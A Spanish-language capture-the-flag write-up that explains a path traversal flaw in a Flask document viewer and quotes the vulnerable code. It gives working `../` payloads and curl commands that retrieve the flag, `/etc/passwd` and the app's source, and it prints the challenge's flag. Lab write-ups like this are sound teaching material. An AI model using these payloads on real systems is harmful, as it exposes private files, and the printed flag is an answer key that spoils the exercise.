# Solución Reto 7: Path Traversal (ctf-path-traversal)

## Descripción
El reto consiste en un portal de documentación corporativa que permite leer archivos internos mediante el parámetro `?file=`. El backend está construido en Flask y la vulnerabilidad radica en que el nombre del archivo se concatena directamente en la ruta del sistema de archivos sin validar que el resultado permanezca dentro del directorio autorizado `/app/docs/`.

```python
filepath = os.path.join("/app/docs", filename)  # filename sin validar
with open(filepath) as f:
    content = f.read()
```

## Pasos para la Explotación

### 1. Reconocer la Funcionalidad
Al acceder al reto, se muestra una lista de documentos disponibles con enlaces del tipo:

```
/view?file=readme.txt
/view?file=manual.txt
/view?file=changelog.txt
```

El parámetro `file` controla qué archivo se lee del servidor. Este es el vector de ataque.

### 2. Entender la Estructura de Directorios
Los archivos se sirven desde `/app/docs/`. Para llegar a la raíz del sistema de archivos (`/`) usando la secuencia `../` (subir un nivel):

```
/app/docs/ → ../ → /app/ → ../ → /
```

Con dos `../` llegamos a `/`. Como podemos añadir los que queramos sin riesgo (al llegar a `/` no se puede subir más), usamos cuatro para mayor seguridad.

### 3. Extracción de la Flag

La flag está en `/flag.txt`. Construimos el payload combinando suficientes `../` para salir de `/app/docs/` y apuntar al archivo:

**Payload:**
```
/view?file=../../../../flag.txt
```

**URL completa:**
```
http://<HOST>:<PORT>/view?file=../../../../flag.txt
```

Al acceder a esa URL, el servidor resuelve la ruta como `/flag.txt` y devuelve su contenido en la página.

**Vía curl:**
```bash
curl "http://<HOST>:<PORT>/view?file=../../../../flag.txt"
```

### 4. Exploración Adicional

Con el mismo vector se pueden leer otros archivos del sistema:

```bash
# Usuarios del sistema
curl "http://<HOST>:<PORT>/view?file=../../../../etc/passwd"

# Código fuente de la app
curl "http://<HOST>:<PORT>/view?file=../app.py"
```

## Flag
```
CTF{p4th_tr4v3rs4l_3xp0s3d}
```
